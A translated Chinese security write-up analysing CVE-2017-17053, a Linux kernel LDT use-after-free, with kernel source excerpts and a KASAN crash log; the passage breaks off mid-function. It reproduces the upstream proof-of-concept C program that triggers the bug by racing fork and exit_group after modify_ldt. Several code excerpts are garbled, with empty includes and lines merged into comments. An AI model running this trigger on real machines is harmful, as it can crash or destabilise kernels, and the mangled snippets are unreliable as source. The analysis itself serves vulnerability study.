# CVE-2017-17053(Linux kernel LDT use after free) 漏洞分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
##  1\. 漏洞信息
>   * 漏洞等级：高
>   * 漏洞类型：UAF
>   * 攻击向量：本地
>   * 权限要求：低
>   * 利用公开：否
>   * 影响范围：   * 漏洞补丁：Linux `commit id`: `ccd5b3235180eef3cfec337df1c8554ab151b5cc`
>   * 修补日期：2017-08-25
>
## 2\. CONFIG_MODIFY_LDT_SYSCALL 编译选项简介
​
要想触发此漏洞，所采用内核需要开启`CONFIG_MODIFY_LDT_SYSCALL`编译选项。虽然该编译选项所支持的功能已经不常用了，但是，这个编译选项在常规的Linux内核编译过程中是默认开启的。在一些需要运行16位汇编指令的程序中可能会用到，比如`DOSEMU`和`wine`。
开了`CONFIG_MODIFY_LDT_SYSCALL`编译选项后，就可以使用`modify_ldt(2)`这个系统调用了。`modify_ldt()`系统调用可以对内核`LDT`(local
descriptor table )进行读写操作。而这个系统调用就是CVE-2017-17053漏洞产生的一个诱因(注意：不是漏洞点)。
## 3\. 漏洞简述
​ UAF(Use-After-Free)漏洞在内存中发生的对象是[struct ldt_struct](https://elixir.free-electrons.com/linux/v4.12.10/source/arch/x86/include/asm/mmu_context.h#L42)
，该对象可以通过`modify_ldt()`系统调用进行分配。在内核中具体分配该对象的函数是`alloc_ldt_struct()`，其上层函数是`init_new_context_ldt()`。在执行`fork()`系统调用内核拷贝父进程内存资源时，也会把父进程的`ldt_struct`进行拷贝。不过由于比较低级的编码错误，如果`alloc_ldt_struct()`执行失败，接着`init_new_context_ldt()`进行相应的错误处理，但`init_new_context_ldt()`上层函数`init_new_context`没有返回相应的错误值，结果无论成功与否都返回0。那么这就导致`mm->context.ldt`指向的`ldt_struct`没有及时更新，仍然残留着父进程的`ldt_struct`。如果该子进程退出并释放这块`ldt_struct`,但是父进程仍然保持这对这块对象的引用，那么最终就会产生UAF漏洞。
## 4\. 漏洞还原
  * Linux内核版本： `v4.12.10`
  * 还原所用commit id ： `6dd29b3df975582ef429b5b93c899e6575785940`
  * 涉及文件：`arch/x86/include/asm/mmu_context.h`​在`commit id`: `ccd5b3235180eef3cfec337df1c8554ab151b5cc` 补丁信息中，提供了一份PoC：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    static void *fork_thread(void *_arg)
    {
        fork();    // B
    }
    int main(void)
    {
        struct user_desc desc = { .entry_number = 8191 };    // D
        syscall(__NR_modify_ldt, 1, &desc, sizeof(desc));    // A
        for (;;) {
            if (fork() == 0) {
                pthread_t t;
                // srand(getpid());
                pthread_create(&t, NULL, fork_thread, NULL);
                // usleep(rand() % 10000);
                syscall(__NR_exit_group, 0);    // C
            }
            wait(NULL);
        }
    }
​ 编译：
    $ gcc poc.c -o cve-2017-17053-poc -pthread
​ 触发结果：
    [   53.627718] BUG: KASAN: use-after-free in free_ldt_struct.part.3+0x81/0x90
    [   53.628663] Read of size 4 at addr ffff88006c749208 by task cve-2017-17053-/5426
    [   53.629858] 
    [   53.630065] CPU: 6 PID: 5426 Comm: cve-2017-17053- Not tainted 4.12.10+ #8
    [   53.630992] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.1-1ubuntu1 04/01/2014
    [   53.632203] Call Trace:
    [   53.632545]  dump_stack+0x4d/0x72
    [   53.633062]  print_address_description+0x6a/0x280
    [   53.633743]  ? free_ldt_struct.part.3+0x81/0x90
    [   53.634371]  kasan_report+0x22b/0x340
    [   53.634883]  __asan_report_load4_noabort+0x14/0x20
    [   53.635569]  free_ldt_struct.part.3+0x81/0x90
    [   53.636183]  destroy_context_ldt+0x60/0x80
    [   53.636740]  __mmdrop+0x4f/0x210
    [   53.637279]  finish_task_switch+0x37e/0x500
    [   53.637942]  schedule_tail+0xe/0xf0
    [   53.638508]  ret_from_fork+0x8/0x30
    [   53.639065] RIP: 0033:0x7f034ce2a2d1
    [   53.639636] RSP: 002b:00007f034cd4aff0 EFLAGS: 00000206 ORIG_RAX: 0000000000000038
    [   53.640754] RAX: 0000000000000000 RBX: 00007f034cd4b700 RCX: 00007f034ce2a2d1
    [   53.641836] RDX: 00007f034cd4b9d0 RSI: 00007f034cd4aff0 RDI: 00000000003d0f00
    [   53.642733] RBP: 0000000000000000 R08: 00007f034cd4b700 R09: 00007f034cd4b700
    [   53.643538] R10: 00007f034cd4b9d0 R11: 0000000000000206 R12: 00007f034d0ea220
    [   53.644308] R13: 00007f034cd4b9c0 R14: 00007f034d515040 R15: 0000000000000003
    [   53.645096] 
    [   53.645279] Allocated by task 2745:
    [   53.645719]  save_stack_trace+0x16/0x20
    [   53.646144]  save_stack+0x46/0xd0
    [   53.646505]  kasan_kmalloc+0xad/0xe0
    [   53.646867]  kmem_cache_alloc_trace+0xcd/0x180
    [   53.647277]  alloc_ldt_struct+0x52/0x140
    [   53.647634]  init_new_context_ldt+0xe2/0x2e0
    [   53.648027]  mm_init.isra.46+0x5c7/0x7e0
    [   53.648391]  copy_process.part.52+0x1d66/0x50c0
    [   53.648804]  _do_fork+0x133/0x7a0
    [   53.649175]  SyS_clone+0x14/0x20
    [   53.649502]  do_syscall_64+0x173/0x380
    [   53.649847]  return_from_SYSCALL_64+0x0/0x6a
    [   53.650238] 
    [   53.650381] Freed by task 5417:
    [   53.650669]  save_stack_trace+0x16/0x20
    [   53.651023]  save_stack+0x46/0xd0
    [   53.651332]  kasan_slab_free+0x72/0xc0
    [   53.651675]  kfree+0x8f/0x190
    [   53.651915]  free_ldt_struct.part.3+0x63/0x90
    [   53.652258]  destroy_context_ldt+0x60/0x80
    [   53.652576]  __mmdrop+0x4f/0x210
    [   53.652843]  mmput+0x1f8/0x270
    [   53.653115]  copy_process.part.52+0x1647/0x50c0
    [   53.653469]  _do_fork+0x133/0x7a0
    [   53.653734]  SyS_clone+0x14/0x20
    [   53.653992]  do_syscall_64+0x173/0x380
    [   53.654293]  return_from_SYSCALL_64+0x0/0x6a
## 5\. 漏洞分析
​
之前有个安全研究员分享了一篇该漏洞的安全分析[2017-08-25](https://xorl.wordpress.com/2017/12/03/cve-2017-17053-linux-kernel-ldt-use-after-free/),
该文章分析比较清晰简洁，但是针对使得`alloc_ldt_struct()`执行失败的方式，文中末尾一带而过并没有过多分析。笔者此次文章旨在重新理清思路，并针对某些细节进行详细分析。
### 1) `ldt_struct`对象分配
​ `ldt_struct`对象由`alloc_ldt_struct()`分配，在v4.12.10内核代码中搜索，该函数可以看到有如下两处引用:
    In folder /home/xxxx/git_new/linux-stable
    Found 3 matches for C symbol: alloc_ldt_struct
    --------------------------------------------------    
    arch/x86/kernel/ldt.c:
        37 [scope: alloc_ldt_struct] static struct ldt_struct *alloc_ldt_struct(int size)
        ..
       125 [scope: init_new_context] new_ldt = alloc_ldt_struct(old_mm->context.ldt->size);
        ..
       255 [scope: write_ldt] new_ldt = alloc_ldt_struct(newsize);
​ 分别是由`write_ldt()`和`init_new_context()`引用，如下:
**write_ldt()**
    static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
    {
        struct mm_struct *mm = current->mm;
        struct ldt_struct *new_ldt, *old_ldt;
        unsigned int oldsize, newsize;
        struct user_desc ldt_info;
        struct desc_struct ldt;
        int error;
        error = -EINVAL;
    ... snip ...
        mutex_lock(&mm->context.lock);
        old_ldt = mm->context.ldt;
        oldsize = old_ldt ? old_ldt->size : 0;
        newsize = max(ldt_info.entry_number + 1, oldsize);
        error = -ENOMEM;
        new_ldt = alloc_ldt_struct(newsize);// context.lock);
    out:
        return error;
    }
**init_new_context()**
    int init_new_context_ldt(struct task_struct *tsk, struct mm_struct *mm)
    {
        struct ldt_struct *new_ldt;
        struct mm_struct *old_mm;
        int retval = 0;
    ... snip ...
        new_ldt = alloc_ldt_struct(old_mm->context.ldt->size);// entries, old_mm->context.ldt->entries,
               new_ldt->size * LDT_ENTRY_SIZE);
        finalize_ldt_struct(new_ldt);
        mm->context.ldt = new_ldt;// context.lock);
        return retval;
    }
​ 以上两个函数都会调用`alloc_ldt_struct()`,并且会有相应的函数返回错误码检查。
​ 经过分析，其中到达`write_ldt()`的内核函数序列是：`sys_modify_ldt() -> write_ldt() ->
alloc_ldt_struct(）`。到达`init_new_context（）`的函数序列是：`sys_clone() -> _do_fork() ->
copy_process() -> mm_init() -> init_new_context() -> init_new_context_ldt() ->
alloc_ldt_struct()`。
​ 当分配完`ldt_struct`，将会把该对象的地址赋给`mm_context_t`结构体的成员变量`struct ldt_struct
*`，`mm_context_t`又是`mm_struct`的成员变量，所以最终`mm_struct`将会包含一个指向`ldt_struct`对象的指针。例如`init_new_context_ldt()`有个赋值点：
    int init_new_context_ldt(struct task_struct *tsk, struct mm_struct *mm)
    {
    ... snip ...
        mm->context.ldt = new_ldt;// <-------------------    ... snip ...
    }
​
如果要想在`mm_struct`结构体中包含一个指向`ldt_struct`对象的有效指针，通过以上分析出的调用序列，我们在用户态使用`modify_ldt()`系统调用即可。如PoC中`A`处所示。
### 2）`ldt_struct`在`fork()`中的拷贝与创建
​ `modify_ldt()`执行完后，当用户态发生`fork()`系统调用创建子进程时(如PoC 的`B`处)，内核将会拷贝相应的父进程内存资源，如下:
    static __latent_entropy struct task_struct *copy_process(
                        unsigned long clone_flags,
                        unsigned long stack_start,
                        unsigned long stack_size,
                        int __user *child_tidptr,
                        struct pid *pid,
                        int trace,
                        unsigned long tls,
                        int node)
    {
    ... snip ...
        /* Perform scheduler related setup. Assign this task to a CPU. */
        retval = sched_fork(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_policy;
        retval = perf_event_init_task(p);
        if (retval)
            goto bad_fork_cleanup_policy;
        retval = audit_alloc(p);
        if (retval)
            goto bad_fork_cleanup_perf;
        /* copy all the process information */
        shm_init_task(p);
        retval = security_task_alloc(p, clone_flags);
        if (retval)
            goto bad_fork_cleanup_audit;
        retval = copy_semundo(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_security;
        retval = copy_files(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_semundo;
        retval = copy_fs(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_files;
        retval = copy_sighand(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_fs;
        retval = copy_signal(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_sighand;
        retval = copy_mm(clone_flags, p);// <-------------------        if (retval)
            goto bad_fork_cleanup_signal;
        retval = copy_namespaces(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_mm;
        retval = copy_io(clone_flags, p);
        if (retval)
            goto bad_fork_cleanup_namespaces;